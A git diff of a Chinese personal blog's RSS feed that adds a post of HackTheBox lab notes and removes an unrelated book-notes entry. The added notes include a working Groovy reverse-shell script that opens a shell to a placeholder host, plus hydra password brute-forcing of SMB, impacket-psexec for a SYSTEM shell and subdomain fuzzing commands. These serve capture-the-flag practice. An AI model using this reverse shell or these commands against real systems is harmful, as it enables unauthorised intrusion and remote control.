@@ -12,12 +12,96 @@
     
     <copyright>本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！</copyright>
     
-    <lastBuildDate>Mon, 20 May 2024 20:07:06 +0000</lastBuildDate>
+    <lastBuildDate>Sun, 22 Mar 2026 00:00:00 +0000</lastBuildDate>
     
     
     <atom:link href="https://test692618.github.io/index.xml" rel="self" type="application/rss&#43;xml" />
     
 
+    
+    
+
+    <item>
+      <title>htb-trick</title>
+      <link>https://test692618.github.io/post/htb-trick/htb-trick/</link>
+      <pubDate>Sun, 22 Mar 2026 00:00:00 &#43;0000</pubDate>
+      <author>xxx@example.com (L)</author>
+      <guid>https://test692618.github.io/post/htb-trick/htb-trick/</guid>
+      <description>
+        <![CDATA[<h1>htb-trick</h1><p>作者：L（xxx@example.com）</p>
+        
+          <h3 id="ttl值判断操作系统">
+<a class="header-anchor" href="#ttl%e5%80%bc%e5%88%a4%e6%96%ad%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f"></a>
+TTL值判断操作系统
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">对比TTL值与操作系统默认值
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">不同操作系统的默认TTL值如下：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Windows: 默认TTL为128
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Linux/Unix: 默认TTL为64
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">macOS: 默认TTL为64
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">网络设备（如路由器）: 通常为255 
+</span></span></code></pre></div><h2 id="smbclient使用注意">
+<a class="header-anchor" href="#smbclient%e4%bd%bf%e7%94%a8%e6%b3%a8%e6%84%8f"></a>
+smbclient使用注意
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">smbclient -L X.X.X.X  -U [USER] 列出主机目录
+</span></span><span class="line"><span class="cl">smbclient  &#39;\\\\X.X.X.X\\Dir&#39;  -U [USER]  进入目录	
+</span></span></code></pre></div><h2 id="redis基础命令">
+<a class="header-anchor" href="#redis%e5%9f%ba%e7%a1%80%e5%91%bd%e4%bb%a4"></a>
+redis基础命令
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">redis  
+</span></span><span class="line"><span class="cl">	info   详情
+</span></span><span class="line"><span class="cl">	select 0-15  选择库
+</span></span><span class="line"><span class="cl">	keys *    查询键
+</span></span><span class="line"><span class="cl">	get key    查询键值
+</span></span></code></pre></div><h2 id="字典推荐">
+<a class="header-anchor" href="#%e5%ad%97%e5%85%b8%e6%8e%a8%e8%8d%90"></a>
+字典推荐
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">sudo apt install seclists -y  # 包含大量字典
+</span></span></code></pre></div><h2 id="groovy反弹shell脚本">
+<a class="header-anchor" href="#groovy%e5%8f%8d%e5%bc%b9shell%e8%84%9a%e6%9c%ac"></a>
+Groovy反弹shell脚本
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-groovy" data-lang="groovy"><span class="line"><span class="cl"><span class="n">String</span> <span class="n">host</span><span class="o">=</span><span class="s2">&#34;XXXX&#34;</span><span class="o">;</span> <span class="c1">// 反弹主机ip
+</span></span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">port</span><span class="o">=</span><span class="n">XX</span><span class="o">;</span> <span class="c1">// 反弹端口
+</span></span></span><span class="line"><span class="cl"><span class="n">String</span> <span class="n">cmd</span><span class="o">=</span><span class="s2">&#34;cmd.exe&#34;</span><span class="o">;</span>   <span class="c1">//windows: cmd.exe   linux : /bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="n">Process</span> <span class="n">p</span><span class="o">=</span><span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="n">cmd</span><span class="o">).</span><span class="na">redirectErrorStream</span><span class="o">(</span><span class="kc">true</span><span class="o">).</span><span class="na">start</span><span class="o">();</span><span class="n">Socket</span> <span class="n">s</span><span class="o">=</span><span class="k">new</span> <span class="n">Socket</span><span class="o">(</span><span class="n">host</span><span class="o">,</span><span class="n">port</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">InputStream</span> <span class="n">pi</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">(),</span><span class="n">pe</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getErrorStream</span><span class="o">(),</span><span class="n">si</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">OutputStream</span> <span class="n">po</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">(),</span><span class="n">so</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span><span class="k">while</span><span class="o">(!</span><span class="n">s</span><span class="o">.</span><span class="na">isClosed</span><span class="o">()){</span><span class="k">while</span><span class="o">(</span><span class="n">pi</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">so</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">pi</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="k">while</span><span class="o">(</span><span class="n">pe</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">so</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">pe</span><span class="o">.</span><span class="na">read</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span><span class="o">(</span><span class="n">si</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">po</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">si</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="n">so</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span><span class="n">po</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span><span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">50</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="o">{</span><span class="n">p</span><span class="o">.</span><span class="na">exitValue</span><span class="o">();</span><span class="k">break</span><span class="o">;}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){}};</span><span class="n">p</span><span class="o">.</span><span class="na">destroy</span><span class="o">();</span><span class="n">s</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span></code></pre></div><h2 id="hydra扫描时smb兼容性问题">
+<a class="header-anchor" href="#hydra%e6%89%ab%e6%8f%8f%e6%97%b6smb%e5%85%bc%e5%ae%b9%e6%80%a7%e9%97%ae%e9%a2%98"></a>
+hydra扫描时smb兼容性问题
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb2://X.X.X.X    //由于协议不匹配导致无法枚举，可使用smb2
+</span></span></code></pre></div><h2 id="impact-psexec工具使用">
+<a class="header-anchor" href="#impact-psexec%e5%b7%a5%e5%85%b7%e4%bd%bf%e7%94%a8"></a>
+impact-psexec工具使用
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-psexec administrator@X.X.X.X  
+</span></span><span class="line"><span class="cl">// Psexec通过在远程系统的ADMIN$共享上上传一个随机命名的可执行文件来创建一个远程服务，然后将其注册为Windows服务。以此产生一个交互式shell，通过TCP端口445在远程Windows系统上执行。Psexec要求具有本地管理员或更高权限的用户的凭据（可以读取/写入ADMIN$ ），验证成功后，将获取一个 NT AUTHORITY<span class="se">\S</span>YSTEM shell
+</span></span></code></pre></div><h2 id="使用fuzz进行域名爆破">
+<a class="header-anchor" href="#%e4%bd%bf%e7%94%a8fuzz%e8%bf%9b%e8%a1%8c%e5%9f%9f%e5%90%8d%e7%88%86%e7%a0%b4"></a>
+使用fuzz进行域名爆破
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt <span class="se">\
+</span></span></span><span class="line"><span class="cl">     -u https://FUZZ.target.com <span class="se">\
+</span></span></span><span class="line"><span class="cl">     -H <span class="s2">&#34;Host: FUZZ.target.com&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">     -t <span class="m">100</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">     -ac <span class="se">\
+</span></span></span><span class="line"><span class="cl">     -o subs.txt
+</span></span></code></pre></div><h2 id="亚马逊云存储管理工具使用">
+<a class="header-anchor" href="#%e4%ba%9a%e9%a9%ac%e9%80%8a%e4%ba%91%e5%ad%98%e5%82%a8%e7%ae%a1%e7%90%86%e5%b7%a5%e5%85%b7%e4%bd%bf%e7%94%a8"></a>
+亚马逊云存储管理工具使用
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws s3 --endpoint<span class="o">=</span>http://s3.thetoppers.htb cp test.php s3://thetoppers.htb  upload: ./test.php to s3://thetoppers.htb/test.php
+</span></span></code></pre></div>
+        
+        <hr><p>本文2026-03-22首发于<a href='https://test692618.github.io/'>HELLO WORLD</a>，最后修改于2026-03-22</p>]]>
+      </description>
+      
+        <category>HTB-tricks</category>
+      
+    </item>
     
     
 
@@ -318,64 +402,6 @@ APK文件结构
       </description>
       
         <category>经济与金融</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>《影响力》笔记</title>
-      <link>https://test692618.github.io/post/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E5%BD%B1%E5%93%8D%E5%8A%9B_%E8%AF%BB%E4%B9%A6%E6%80%BB%E7%BB%93/</link>
-      <pubDate>Sun, 10 Mar 2024 18:11:55 &#43;0000</pubDate>
-      <author>xxx@example.com (L)</author>
-      <guid>https://test692618.github.io/post/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E5%BD%B1%E5%93%8D%E5%8A%9B_%E8%AF%BB%E4%B9%A6%E6%80%BB%E7%BB%93/</guid>
-      <description>
-        <![CDATA[<h1>《影响力》笔记</h1><p>作者：L（xxx@example.com）</p>
-        
-          <h2 id="第一章">
-<a class="header-anchor" href="#%e7%ac%ac%e4%b8%80%e7%ab%a0"></a>
-第一章
-</h2><ul>
-<li>
-<p>机械反应：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">人在面对不了解的事物时，会出现if判断的情况，例如，贵就是好。
-</span></span></code></pre></div></li>
-<li>
-<p>直觉对比：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">鲁迅曾说，中国人总是折中的，你要开窗，他们不同意，但你要拆屋顶，他们又同意开窗了。
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">例如，买东西时，售货员先推销贵的产品，再推销便宜产品，会更容易卖出去。因为你会通过对比感觉东西便宜。
-</span></span></code></pre></div></li>
-</ul>
-<h2 id="第二章">
-<a class="header-anchor" href="#%e7%ac%ac%e4%ba%8c%e7%ab%a0"></a>
-第二章
-</h2><ul>
-<li>
-<p>互利互惠：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">人在受到别人的帮助/恩惠后，会本能的产生回报别人的意愿，即使你并不喜欢那个人，即使那个人是个恶人。
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">举例来说,4S店中存在各种免费小零食和免费试驾，会使你产生愧疚的心理状态，会更容易产生消费的冲动。
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">办公室中，主动去帮助别人，与别人分享好东西的人，更容易得到帮助。
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">在请人填写问卷时，附送一些小礼品，成功率更高。
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">社会中，懂得送礼，更容易得到提拔。
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">两个互相战争的国家，也会存在这种关系，如果一方不对另一个国家入住的企业进行刁难，相反的另一个国家也不会刁难。
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">收到别人感谢后，将&#34;不客气/没事&#34;换成&#34;不客气，换您也会这样做的&#34;  ，也是利用了互惠，因为这句话的潜台词是 &#34;您也很善良。&#34;
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">推销食物，提供免费试吃品，会导致客人产生愧疚感，从而提高成功率。
-</span></span></code></pre></div></li>
-<li>
-<p>个性化定制礼物</p>
-        
-        <hr><p>本文2024-03-10首发于<a href='https://test692618.github.io/'>HELLO WORLD</a>，最后修改于2024-03-10</p>]]>
-      </description>
-      
-        <category>读书笔记</category>
       
     </item>
     
